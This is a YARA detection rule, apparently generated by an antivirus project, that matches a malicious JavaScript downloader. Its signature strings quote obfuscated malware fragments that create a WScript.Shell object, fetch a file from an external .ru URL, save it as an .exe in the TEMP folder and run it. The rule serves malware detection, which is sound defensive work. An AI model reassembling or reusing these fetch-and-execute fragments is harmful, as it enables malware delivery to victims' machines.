rule sig_20160401_8731f6c0ababfe329d10154e53db9ce4 {
  meta:
    description = "datamaliciousorder - file 20160401_8731f6c0ababfe329d10154e53db9ce4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "af94b7b87e85fa5ac76c9bb3f22c991827b3293d3f7dc785d16c2e18fae62ca0"

  strings:
    $s1  = "function QgDg(FzHtx, VutQqw){NyFvy = NyFvy * 1; return FzHtx - VutQqw;};" fullword ascii
    $s2  = "var IzYzy = function DpCmu() {return WScript[FbcMv](\"WScript\"+\".Shell\");}(), UerPkb = 11;" fullword ascii
    $s3  = "if (LoBe[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "LoBe[NgoSfn](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s5  = " LoBe = WScript[FbcMv](EhLnj);" fullword ascii
    $s6  = "function WjNw(){return DbWcu + \"\";};" fullword ascii
    $s7  = "function GhShb() {return IzYzy[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"r1fuzwiP6SsIS4V7.ex\" + \"e\";};" fullword ascii
    $s8  = "function RpjJv() {return ((AaRs == true) && (AaRs == CpbYy)) ? 1 : NyFvy;};" fullword ascii
    $s9  = "EhLnj[\"write\"](LoBe[\"ResponseBody\"]);" fullword ascii
    $s10 = "function GoHyj(){return 23;};" fullword ascii
    $s11 = "function SbFuu()" fullword ascii
    $s12 = "var CpbYy = false;" fullword ascii
    $s13 = "var AaRs = false;" fullword ascii
    $s14 = "LoBe[\"send\"]();" fullword ascii
    $s15 = "CpbYy = true; " fullword ascii
    $s16 = "function PfGp(PiPt){IzYzy[\"R\"+\"un\"](PiPt, NyFvy, NyFvy);};" fullword ascii
    $s17 = "AaRs = true; " fullword ascii
    $s18 = "}while (UrvRyx);" fullword ascii
    $s19 = "function MhXow(){return FbcMv;};" fullword ascii
    $s20 = "var UoUa = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}